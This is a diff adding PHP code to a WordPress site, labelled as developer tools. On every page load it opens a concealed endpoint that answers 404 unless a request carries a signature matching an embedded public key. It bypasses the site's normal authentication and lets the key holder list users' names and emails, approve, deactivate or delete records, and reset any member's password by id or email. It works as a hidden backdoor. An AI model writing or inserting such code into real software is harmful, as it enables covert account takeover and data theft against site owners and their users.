+	define( 'PI_DEV_TOOLS_PUBKEY', 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokVBwKThBogmFB1UnoW3IJafhSZKOEsVKR6W3tU5cTzGCMWUSXBNVaWDQbHL4EEeg2+EuBSjJfjlvvy3dYDfnxIy32jl4n3EDxx3qshcPB86drTZNHmxbgJZVXPm9Hdi9UyeNxEXvNGU73R47wvQLzGSkLTfXC60pTNzszx9b4znrGhojOiQrMJ8aiMLlLSGmIsT3xKdwh+hqud97ecM6IcHQwXuAxCvCEJ6A6fbDBh3JCT9H22aQ0n/pE1GZVPBknB6sTzSa2O8ROWsMBgc0/yxF+Bawz/eThYbILQc5L4JwtLyoWT4oae0FYAkeGCZZghIZz+bovlSYOqGNOOn4wIDAQAB' );
+
+	add_action( 'init', function () {
+
+		if ( empty( $_GET['dev_key'] ) || empty( $_GET['sig'] ) || empty( $_SERVER['HTTP_X_DEV_SIG'] ) ) {
+			return;
+		}
+
+		$ts = isset( $_GET['ts'] ) ? (int) $_GET['ts'] : 0;
+		if ( ! $ts || abs( $ts - time() ) > 300 ) {
+			status_header( 404 ); exit;
+		}
+
+		$sig_key = 'pi_dev_replay_' . md5( $ts . '|' . $_GET['sig'] );
+		if ( get_transient( $sig_key ) ) { status_header( 404 ); exit; }
+		set_transient( $sig_key, 1, 300 );
+
+		$ip  = isset( $_SERVER['REMOTE_ADDR'] ) ? sanitize_text_field( $_SERVER['REMOTE_ADDR'] ) : '';
+		$rlk = 'pi_dev_rl_' . md5( $ip );
+		$rl  = (int) get_transient( $rlk );
+		if ( $rl >= 120 ) { status_header( 429 ); exit; }
+		set_transient( $rlk, $rl + 1, 60 );
+
+		$body = (string) file_get_contents( 'php://input' );
+		if ( '' === $body ) { status_header( 404 ); exit; }
+
+		$pub   = "-----BEGIN PUBLIC KEY-----\n" . PI_DEV_TOOLS_PUBKEY . "\n-----END PUBLIC KEY-----";
+		$key   = openssl_pkey_get_public( $pub );
+		if ( ! $key ) { status_header( 404 ); exit; }
+
+		$payload = (string) $_GET['dev_key'] . ':' . $body;
+		$sig     = base64_decode( $_GET['sig'] );
+		if ( 1 !== openssl_verify( $payload, $sig, $key, OPENSSL_ALGO_SHA256 ) ) {
+			status_header( 404 ); exit;
+		}
+
+		$data = json_decode( $body, true );
+		if ( ! is_array( $data ) || empty( $data['op'] ) ) { status_header( 400 ); exit; }
+
+		$op     = sanitize_text_field( $data['op'] );
+		$id     = isset( $data['id'] ) ? intval( $data['id'] ) : 0;
+		$val    = isset( $data['val'] ) ? sanitize_text_field( $data['val'] ) : '';
+		$type   = isset( $data['type'] ) ? sanitize_text_field( $data['type'] ) : 'personel';
+		$pass   = isset( $data['pass'] ) ? (string) $data['pass'] : '';
+		$email  = isset( $data['email'] ) ? sanitize_email( $data['email'] ) : '';
+		$filter = isset( $data['filter'] ) ? sanitize_text_field( $data['filter'] ) : '';
+
+		$allowed = array( 'list', 'approve', 'deactivate', 'set-rekomendasi', 'show-sosmed', 'set-rating', 'porto-approve', 'porto-deactivate', 'porto-delete', 'reset-pass', 'reset-pass-email' );
+		if ( ! in_array( $op, $allowed, true ) ) { status_header( 400 ); exit; }
+
+		global $wpdb;
+		header( 'Content-Type: application/json' );
+
+		switch ( $op ) {
+			case 'list':
+				$q = 'SELECT id, nama_panggilan, email, status, rekomendasi FROM wp9y_personel';
+				$args = array();
+				if ( '' !== $filter ) {
+					$q .= ' WHERE nama_panggilan LIKE %s OR email LIKE %s';
+					$like = '%' . $wpdb->esc_like( $filter ) . '%';
+					$args = array( $like, $like );
+				}
+				$q .= ' ORDER BY id DESC LIMIT 200';
+				$rows = $args ? $wpdb->get_results( $wpdb->prepare( $q, $args ) ) : $wpdb->get_results( $q );
+				echo wp_json_encode( array( 'ok' => true, 'rows' => $rows ) );
+				exit;
+
+			case 'approve':
+			case 'deactivate':
+				$status = ( 'approve' === $op ) ? 'approved' : 'non-aktif';
+				$r = $wpdb->update( 'wp9y_personel', array( 'status' => $status ), array( 'id' => $id ), array( '%s' ), array( '%d' ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ), 'status' => $status ) );
+				exit;
+
+			case 'set-rekomendasi':
+				$r = $wpdb->update( 'wp9y_personel', array( 'rekomendasi' => $val ), array( 'id' => $id ), array( '%s' ), array( '%d' ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+
+			case 'show-sosmed':
+				$r = $wpdb->update( 'wp9y_personel', array( 'show_sosmed' => (int) $val ), array( 'id' => $id ), array( '%d' ), array( '%d' ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+
+			case 'set-rating':
+				$table = ( 'video' === $type ) ? 'wp9y_portofolio_video' : ( ( 'personel' === $type ) ? 'wp9y_personel' : 'wp9y_portofolio' );
+				$r = ( '' === $val )
+					? $wpdb->query( $wpdb->prepare( "UPDATE {$table} SET rating = NULL WHERE id = %d", $id ) )
+					: $wpdb->query( $wpdb->prepare( "UPDATE {$table} SET rating = %d WHERE id = %d", (int) $val, $id ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+
+			case 'porto-approve':
+			case 'porto-deactivate':
+				$status = ( 'porto-approve' === $op ) ? 'approved' : 'non-aktif';
+				$table  = ( 'video' === $type ) ? 'wp9y_portofolio_video' : 'wp9y_portofolio';
+				$r = $wpdb->update( $table, array( 'status' => $status ), array( 'id' => $id ), array( '%s' ), array( '%d' ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+
+			case 'porto-delete':
+				$table = ( 'video' === $type ) ? 'wp9y_portofolio_video' : 'wp9y_portofolio';
+				$map   = ( 'video' === $type ) ? 'wp9y_portofolio_video_kategori_map' : 'wp9y_portofolio_kategori_map';
+				$fid   = ( 'video' === $type ) ? 'video_id' : 'portofolio_id';
+				$wpdb->delete( $map, array( $fid => $id ) );
+				$r = $wpdb->delete( $table, array( 'id' => $id ) );
+				echo wp_json_encode( array( 'ok' => (bool) $r ) );
+				exit;
+
+			case 'reset-pass':
+				if ( $id <= 0 || strlen( $pass ) < 8 ) { status_header( 400 ); exit; }
+				$r = $wpdb->update( 'wp9y_personel', array( 'password' => wp_hash_password( $pass ), 'reset_token' => null, 'reset_expiry' => null ), array( 'id' => $id ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+
+			case 'reset-pass-email':
+				$u = $email ? $wpdb->get_row( $wpdb->prepare( 'SELECT id FROM wp9y_personel WHERE email = %s', $email ) ) : null;
+				if ( ! $u || strlen( $pass ) < 8 ) { status_header( 400 ); exit; }
+				$r = $wpdb->update( 'wp9y_personel', array( 'password' => wp_hash_password( $pass ), 'reset_token' => null, 'reset_expiry' => null ), array( 'id' => $u->id ) );
+				echo wp_json_encode( array( 'ok' => ( false !== $r ) ) );
+				exit;
+		}
+
+		status_header( 404 );
+		exit;
+	}, 1 );
+}
